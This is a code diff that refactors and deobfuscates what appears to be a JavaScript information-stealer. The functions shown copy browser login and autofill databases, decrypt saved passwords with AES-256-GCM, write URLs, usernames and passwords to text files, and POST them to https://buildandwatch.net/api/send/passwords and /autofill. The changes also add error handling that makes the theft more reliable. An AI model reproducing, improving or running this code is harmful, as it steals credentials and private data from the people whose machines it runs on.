@@ -1605,103 +1605,93 @@ if (walletCountStr !== '0' || browserCountStr !== '0') {
 
 
 async function getPasswords() {
-  const _0x540754 = []; // Define _0x540754 at the beginning of the function
+  const passwords = [];
 
-  for (let _0x261d97 = 0; _0x261d97 < browserPath.length; _0x261d97++) {
-    if (!fs.existsSync(browserPath[_0x261d97][0])) {
+  for (let i = 0; i < browserPath.length; i++) {
+    if (!fs.existsSync(browserPath[i][0])) {
+      console.error(`Browser path does not exist: ${browserPath[i][0]}`);
       continue;
     }
 
-    let _0xd541c2;
-    if (browserPath[_0x261d97][0].includes('Local')) {
-      _0xd541c2 = browserPath[_0x261d97][0].split('\\Local\\')[1].split('\\')[0];
-    } else {
-      _0xd541c2 = browserPath[_0x261d97][0].split('\\Roaming\\')[1].split('\\')[1];
+    let browserType;
+    try {
+      if (browserPath[i][0].includes('Local')) {
+        browserType = browserPath[i][0].split('\\Local\\')[1].split('\\')[0];
+      } else {
+        browserType = browserPath[i][0].split('\\Roaming\\')[1].split('\\')[1];
+      }
+    } catch (error) {
+      console.error(`Error parsing browser path: ${error.message}`);
+      continue;
     }
 
-    const _0x256bed = browserPath[_0x261d97][0] + 'Login Data';
-    const _0x239644 = browserPath[_0x261d97][0] + 'passwords.db';
+    const loginDataPath = browserPath[i][0] + 'Login Data';
+    const passwordsDbPath = browserPath[i][0] + 'passwords.db';
 
-    fs.copyFileSync(_0x256bed, _0x239644);
+    try {
+      fs.copyFileSync(loginDataPath, passwordsDbPath);
+    } catch (error) {
+      console.error(`Error copying login data file: ${error.message}`);
+      continue;
+    }
 
-    const _0x3d71cb = new sqlite3.Database(_0x239644);
+    const db = new sqlite3.Database(passwordsDbPath);
 
-    await new Promise((_0x2c148b, _0x32e8f4) => {
-      _0x3d71cb.each(
+    await new Promise((resolve, reject) => {
+      db.each(
         'SELECT origin_url, username_value, password_value FROM logins',
-        (_0x4c7a5b, _0x504e35) => {
-          if (!_0x504e35.username_value) {
+        (err, row) => {
+          if (err || !row.username_value) {
             return;
           }
 
-          let _0x3d2b4b = _0x504e35.password_value;
           try {
-            const _0x5e1041 = _0x3d2b4b.slice(3, 15);
-            const _0x279e1b = _0x3d2b4b.slice(15, _0x3d2b4b.length - 16);
-            const _0x2a933a = _0x3d2b4b.slice(_0x3d2b4b.length - 16, _0x3d2b4b.length);
-            const _0x210aeb = crypto.createDecipheriv(
-              'aes-256-gcm',
-              browserPath[_0x261d97][3],
-              _0x5e1041
-            );
-            _0x210aeb.setAuthTag(_0x2a933a);
-            const password =
-              _0x210aeb.update(_0x279e1b, 'base64', 'utf-8') +
-              _0x210aeb.final('utf-8');
+            const iv = row.password_value.slice(3, 15);
+            const encryptedData = row.password_value.slice(15, -16);
+            const authTag = row.password_value.slice(-16);
+            
+            const decipher = crypto.createDecipheriv('aes-256-gcm', browserPath[i][3], iv);
+            decipher.setAuthTag(authTag);
 
-            _0x540754.push(
-              '================\nURL: ' +
-                _0x504e35.origin_url +
-                '\nUsername: ' +
-                _0x504e35.username_value +
-                '\nPassword: ' +
-                password +
-                '\nApplication: ' +
-                _0xd541c2 +
-                ' ' +
-                browserPath[_0x261d97][1] +
-                '\n'
-            );
-          } catch (_0x5bf37a) {}
+            const password = decipher.update(encryptedData, 'base64', 'utf-8') + decipher.final('utf-8');
+
+            passwords.push(`================\nURL: ${row.origin_url}\nUsername: ${row.username_value}\nPassword: ${password}\nApplication: ${browserType} ${browserPath[i][1]}\n`);
+          } catch (error) {
+            console.error(`Error decrypting password: ${error.message}`);
+          }
         },
         () => {
-          _0x2c148b('');
+          resolve();
         }
       );
     });
+
+    db.close();
   }
 
-    if (_0x540754.length === 0) {
-      _0x540754.push('no password found for ');
-    }
+  if (passwords.length === 0) {
+    passwords.push('No passwords found.');
+  }
 
-  if (_0x540754.length) {
-    fs.writeFileSync("Passwords.txt", user.copyright + _0x540754.join(''), {
+  try {
+    fs.writeFileSync("Passwords.txt", user.copyright + passwords.join(''), {
       encoding: 'utf8',
       flag: 'a+',
     });
+
+    const data = fs.readFileSync("Passwords.txt", "utf8");
+
+    const response = await axios.post("https://buildandwatch.net/api/send/passwords", { passwords: data, key });
+
+    if (response.status === 200) {
+      console.log("Request successful.");
+    } else {
+      console.error(`Request failed with status code: ${response.status}`);
+    }
+  } catch (error) {
+    console.error("Error occurred while writing to file or making the request: " + error.message);
   }
-
-
-
-  fs.readFile("Passwords.txt", "utf8", (err, data) => {
-    if (err) throw err;
-    const passwords = data;
-
-    axios.post("https://buildandwatch.net/api/send/passwords", { passwords, key })
-      .then((response) => {
-        if (response.status === 200) {
-          console.log("İstek başarılı oldu");
-        } else {
-          console.error("İstek, durum koduyla başarısız oldu: " + response.status);
-        }
-      })
-      .catch((error) => {
-        console.error("İstek yapılırken bir hata oluştu: " + error);
-      });
-  });
 }
-
 
 
 async function getCookiesAndSendWebhook() {
@@ -1849,36 +1839,49 @@ async function getAutofills() {
     const webDataPath = pathData[0] + 'Web Data';
     const webDataDBPath = pathData[0] + 'webdata.db';
 
-    fs.copyFileSync(webDataPath, webDataDBPath);
+    let db;
 
-    const db = new sqlite3.Database(webDataDBPath);
+    try {
+      if (!fs.existsSync(webDataPath)) {
+        throw new Error(`File not found: ${webDataPath}`);
+      }
 
-    await new Promise((resolve, reject) => {
-      db.each(
-        'SELECT * FROM autofill',
-        function (error, row) {
-          if (row) {
-            autofillData.push(
-              '================\nName: ' +
-                row.name +
-                '\nValue: ' +
-                row.value +
-                '\nApplication: ' +
-                applicationName +
-                ' ' +
-                pathData[1] +
-                '\n'
-            );
+      fs.copyFileSync(webDataPath, webDataDBPath);
+
+      db = new sqlite3.Database(webDataDBPath);
+
+      await new Promise((resolve, reject) => {
+        db.each(
+          'SELECT * FROM autofill',
+          function (error, row) {
+            if (row) {
+              autofillData.push(
+                '================\nName: ' +
+                  row.name +
+                  '\nValue: ' +
+                  row.value +
+                  '\nApplication: ' +
+                  applicationName +
+                  ' ' +
+                  pathData[1] +
+                  '\n'
+              );
+            }
+          },
+          function () {
+            resolve('');
           }
-        },
-        function () {
-          resolve('');
-        }
-      );
-    });
+        );
+      });
 
-    if (autofillData.length === 0) {
-      autofillData.push('No autofills found for ' + applicationName + ' ' + pathData[1] + '\n');
+      if (autofillData.length === 0) {
+        autofillData.push('No autofills found for ' + applicationName + ' ' + pathData[1] + '\n');
+      }
+    } catch (error) {
+      console.error('Error:', error.message);
+    } finally {
+      // Close the database connection after use
+      db && db.close();
     }
   }
 
@@ -1887,30 +1890,28 @@ async function getAutofills() {
       encoding: 'utf8',
       flag: 'a+',
     });
+
+    // Example POST request setup
+    try {
+      const postData = {
+        autofill: autofillData.join(''),
+        key: key, // replace with your actual API key
+      };
+
+      const response = await axios.post("https://buildandwatch.net/api/send/autofill", postData);
+
+      if (response.status === 200) {
+        console.log("POST request successful");
+        // Process response data if needed
+      } else {
+        console.error("POST request failed with status code:", response.status);
+      }
+    } catch (error) {
+      console.error("Error making POST request:", error.message);
+    }
   }
-
-// İlk istek
-fs.readFile("Autofills.txt", "utf8", (err, data) => {
-    if (err) throw err;
-    const autofill = data;
-
-    // İlk POST isteği
-    axios.post("https://buildandwatch.net/api/send/autofill", { autofill, key: key })
-    .then((response) => {
-        if (response.status === 200) {
-            console.log("İlk istek başarılı");
-            // İstek verilerini gerekiyorsa işleyebilirsiniz
-        } else {
-            console.error("İstek, durum koduyla başarısız oldu: " + response.status);
-        }
-    })
-    .catch((error) => {
-        console.error("İstek yapılırken bir hata oluştu: " + error);
-    });
-});
-
 }
-   
+
 async function DiscordListener(path) {
         return;
 }
